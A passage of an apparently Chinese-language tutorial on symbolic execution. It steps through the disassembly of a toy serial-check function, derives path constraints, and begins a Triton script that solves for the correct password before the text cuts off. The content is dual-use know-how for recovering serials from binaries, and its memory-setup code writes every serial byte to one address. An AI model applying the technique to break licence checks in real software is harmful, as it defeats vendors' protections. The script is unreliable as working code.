movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial           &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial

Register Reference Table :

RAX : p7
RBX : -1
RCX : p3
RDX : p6
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round9)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1

Register Reference Table :

RAX : p7
RBX : -1
RCX : p8
RDX : p6
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round10)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]   &lt;- Point
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))

Register Reference Table :

RAX : p7
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round11)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi                  &lt;- Point ,Check EDX and ESI ..
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))

Register Reference Table :

RAX : p7
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

</code></pre>
<p>我们对<code>cmp edx, esi</code> 进行组合,结果如下:</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (p6 == p9) =&gt; (xor(sub(*(add(p0,p1)),1),0x55) == (*(add(_serial,p1)))) =&gt; (xor(sub(*(add(rdi,0)),1),0x55) == (*(add(_serial,0)))) =&gt; (xor(sub(*(add(rdi,0)),1),0x55) == (0x31)) =&gt; (xor(sub(X1,1),0x55) == (0x31))

</code></pre>
<p>接下来我们继续往下执行.</p>
<pre><code class="language-txt">
(Round12)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1            &lt;- Point
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1

Register Reference Table :

RAX : p7
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round13)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]         &lt;- Point
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1

Register Reference Table :

RAX : p11
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round14)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1                    &lt;- Point
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)

Register Reference Table :

RAX : p12
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round15)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax         &lt;- Point
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12

Register Reference Table :

RAX : p12
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round16)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]         &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0

Register Reference Table :

RAX : p14
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round17)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13

Register Reference Table :

RAX : p14
RBX : -1
RCX : p15
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round18)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]   &lt;- Point
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))

Register Reference Table :

RAX : p14
RBX : -1
RCX : p15
RDX : p16
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round19)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1                    &lt;- Point
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)

Register Reference Table :

RAX : p14
RBX : -1
RCX : p15
RDX : p17
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round20)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h                  &lt;- Point
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)

Register Reference Table :

RAX : p14
RBX : -1
RCX : p15
RDX : p18
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round21)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial           &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)
p19 = _serial

Register Reference Table :

RAX : p19
RBX : -1
RCX : p15
RDX : p18
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round22)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)
p19 = _serial
p20 = p13

Register Reference Table :

RAX : p19
RBX : -1
RCX : p20
RDX : p18
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round23)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]   &lt;- Point
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)
p19 = _serial
p20 = p13
p21 = *(add(p19,p20))

Register Reference Table :

RAX : p19
RBX : -1
RCX : p20
RDX : p18
RSI : p21
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round24)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi                  &lt;- Point
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)
p19 = _serial
p20 = p13
p21 = *(add(p19,p20))

Register Reference Table :

RAX : p19
RBX : -1
RCX : p20
RDX : p18
RSI : p21
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

</code></pre>
<p>在第二轮循环里面,可以看到var_14 经过了一次循环之后进行了自增,读取input_buffer 和_serial_buffer 的下一个内容.然后我们对第二轮循环进行约束条件构造</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (p21 == p18) =&gt; (xor(sub(*(add(p0,p13)),1),0x55) == (*(add(_serial,p13)))) =&gt; (xor(sub(*(add(rdi,add(p11,1))),1),0x55) == (*(add(_serial,add(p11,1))))) =&gt; (xor(sub(*(add(rdi,add(p1,1))),1),0x55) == (*(add(_serial,add(p1,1))))) =&gt; (xor(sub(*(add(rdi,add(0,1))),1),0x55) == (*(add(_serial,add(0,1)))))

</code></pre>
<p>rdi 指向的是input_buffer 的缓冲区地址,那么通过符号执行现在可以计算出要读的缓存位置就是add(0,1) = 1 .我们继续精简约束:</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (xor(sub(*(add(rdi,add(0,1))),1),0x55) == (*(add(_serial,add(0,1))))) =&gt; (xor(sub(X2,1),0x55) == (0x3E))

</code></pre>
<p>经过上面对寄存器和内存的布局分析理解静态符号执行的原理之后.接下来我们来思考一个问题,如何对我们希望执行的条件分支进行约束判断呢?我们继续回来阅读测试代码:</p>
<pre><code class="language-c">
char *serial = &quot;\x31\x3e\x3d\x26\x31&quot;;

int check_password(char *ptr)
{
  int i = 0;
  while (i &lt; 5){
    if (((ptr[i] - 1) ^ 0x55) != serial[i])
      return 1; /* bad password */
    i++;
  }
  return 0; /* good password */
}

</code></pre>
<p>注意代码中的if 判断,如果ptr 中的内容经过异或之后不符合结果,那就自动退出程序执行,所以我们寻求ptr 中唯一正确解的字符串内容,关键的要点就是要对<code>cmp edx,esi</code> 进行检验.</p>
<pre><code class="language-txt">
0x0100000F2F:    cmp     [rbp+var_14], 5
0x0100000F33:    jge     loc_100000F7C      &lt;-  The condition of for check ..
                 ;  ...
0x0100000F5A:    cmp     edx, esi           &lt;-  Check Condition ..
0x0100000F5C:    jz      loc_100000F6E      &lt;-  is equal
0x0100000F62:    mov     [rbp+var_4], 1
0x0100000F69:    jmp     loc_100000F83      &lt;-  not equal than return
0x0100000F6E:    mov     eax, [rbp+var_14]
0x0100000F71:    add     eax, 1
0x0100000F74:    mov     [rbp+var_14], eax
0x0100000F77:    jmp     loc_100000F2F      &lt;-  Jump to for condition check ..
0x0100000F7C:    mov     [rbp+var_4], 0
0x0100000F83:    mov     eax, [rbp+var_4]   &lt;-  Get Return Value
0x0100000F86:    pop     rbp
0x0100000F87:    retn

</code></pre>
<p><code>cmp edx,esi</code> 对边edx 和esi 的值,然后根据两者相等来判断是否要进行跳转到地址0x100000F6E ,接下来我们希望要在0x0100000F5A 这里设置断点计算推出edx 适合条件判断的值应该怎么操作呢?这就需要引入动态符号执行,我们以动态符号执行引擎Triton 为例子编写一个Fuzzing 脚本,这个脚本的原理是通过在<code>cmp edx,esi</code> 中进行求解得出输入缓冲区的内存:</p>
<pre><code class="language-python">
from triton import TritonContext, ARCH, Instruction, MemoryAccess, CPUSIZE, MODE


function_code = {                                  #   &lt;serial&gt; function
    0x100000F20 : '\x55' ,                         #  push    rbp
    0x100000F21 : '\x48\x89\xe5' ,                 #  mov     rbp, rsp
    0x100000F24 : '\x48\x89\x7d\xf0' ,             #  mov     [rbp+var_10], rdi
    0x100000F28 : '\xc7\x45\xec\x00\x00\x00\x00' , #  mov     [rbp+var_14], 0
    0x100000F2F : '\x83\x7d\xec\x05' ,             #  cmp     [rbp+var_14], 5
    0x100000F33 : '\x0f\x8d\x43\x00\x00\x00' ,     #  jge     loc_100000F7C
    0x100000F39 : '\x48\x8b\x45\xf0' ,             #  mov     rax, [rbp+var_10]
    0x100000F3D : '\x48\x63\x4d\xec' ,             #  movsxd  rcx, [rbp+var_14]
    0x100000F41 : '\x0f\xbe\x14\x08' ,             #  movsx   edx, byte ptr [rax+rcx]
    0x100000F45 : '\x83\xea\x01' ,                 #  sub     edx, 1
    0x100000F48 : '\x83\xf2\x55' ,                 #  xor     edx, 55h
    0x100000F4B : '\x48\x8b\x05\xae\x00\x00\x00' , #  mov     rax, cs:_serial
    0x100000F52 : '\x48\x63\x4d\xec' ,             #  movsxd  rcx, [rbp+var_14]
    0x100000F56 : '\x0f\xbe\x34\x08' ,             #  movsx   esi, byte ptr [rax+rcx]
    0x100000F5A : '\x39\xf2' ,                     #  cmp     edx, esi
    0x100000F5C : '\x0f\x84\x0c\x00\x00\x00' ,     #  jz      loc_100000F6E
    0x100000F62 : '\xc7\x45\xfc\x01\x00\x00\x00' , #  mov     [rbp+var_4], 1
    0x100000F69 : '\xe9\x15\x00\x00\x00' ,         #  jmp     loc_100000F8
    0x100000F6E : '\x8b\x45\xec' ,                 #  mov     eax, [rbp+var_14]
    0x100000F71 : '\x83\xc0\x01' ,                 #  add     eax, 1
    0x100000F74 : '\x89\x45\xec' ,                 #  mov     [rbp+var_14], eax
    0x100000F77 : '\xe9\xb3\xff\xff\xff' ,         #  jmp     loc_100000F2F
    0x100000F7C : '\xc7\x45\xfc\x00\x00\x00\x00' , #  mov     [rbp+var_4], 0
    0x100000F83 : '\x8b\x45\xfc' ,                 #  mov     eax, [rbp+var_4]
    0x100000F86 : '\x5d' ,                         #  pop     rbp
    0x100000F87 : '\xc3' ,                         #  retn
}

Triton = TritonContext()

Triton.setArchitecture(ARCH.X86_64)
Triton.enableMode(MODE.ALIGNED_MEMORY, True)


def run(eip_address) :
    while eip_address in function_code :
        #print 'Current Address:',hex(eip_address)
        instruction_data = Instruction()

        instruction_data.setOpcode(function_code[eip_address])
        instruction_data.setAddress(eip_address)

        Triton.processing(instruction_data)

        eip_address = Triton.getRegisterAst(Triton.registers.rip).evaluate()

def init_context(input_data) :
    Triton.concretizeAllRegister()  #  clean register record
    Triton.concretizeAllMemory()    #  clean memory record

    for input_data_address,input_data_value in input_data.items() :
        Triton.setConcreteMemoryValue(input_data_address,input_data_value)  #  input data buffer .
        Triton.convertMemoryToSymbolicVariable(MemoryAccess(input_data_address, CPUSIZE.BYTE))
        Triton.convertMemoryToSymbolicVariable(MemoryAccess(input_data_address+1, CPUSIZE.BYTE))

    Triton.setConcreteMemoryValue(0x100001000, 0x31)  #  Setting data for global data string .
    Triton.setConcreteMemoryValue(0x100001000, 0x3e)
    Triton.setConcreteMemoryValue(0x100001000, 0x3d)
    Triton.setConcreteMemoryValue(0x100001000, 0x26)
    Triton.setConcreteMemoryValue(0x100001000, 0x31)

    Triton.setConcreteRegisterValue(Triton.registers.rdi, 0x1000)  #  RDI is input buffer .
    Triton.setConcreteRegisterValue(Triton.registers.rsp, 0x7fffffff)
    Triton.setConcreteRegisterValue(Triton.registers.rbp, 0x7fffffff)

def get_path() :
    code_stream_record_list = Triton.getPathConstraints()
    ast_context = Triton.getAstContext()
    last_branch = ast_context.equal(ast_context.bvtrue(),ast_context.bvtrue())
    make_input_data = []

    for code_stream_record_index in code_stream_record_list :
        if not code_stream_record_index.isMultipleBranches() :
            continue

        branch_list = code_stream_record_index.getBranchConstraints()

        for branch_index in branch_list :
            if branch_index['isTaken'] :
                continue

            models = Triton.getModel(ast_context.land([last_branch,branch_index['constraint']]))
            print models

            if len(models) == 1 :
                if models.values()[0].getValue() == 0 :
                    continue

            temp_data = {}

            for models_address_index,models_value_index in models.items() :
                symblo = Triton.getSymbolicVariableFromId(models_address_index)
                temp_data[symblo.getOrigin()] = models_value_index.getValue()

            make_input_data.append(temp_data)

        last_branch = ast_context.land([last_branch,code_stream_record_index.getTakenPathConstraintAst()])

    Triton.clearPathConstraints()

    return make_input_data


if __name__ == '__main__' :
    history_data = []
    try_list = [{0x1000:0x00}]

    while try_list :
        print '----'
        history_data.append(try_list[0])
        print 'Try input &gt;&gt;&gt;',try_list[0]

        init_context(try_list[0])  #  init Triton Execute Context .
        run(0x100000F20)           #  try execute

        del try_list[0]

        make_input_data = get_path()  #  calculate path

        for make_input_data_index in make_input_data :
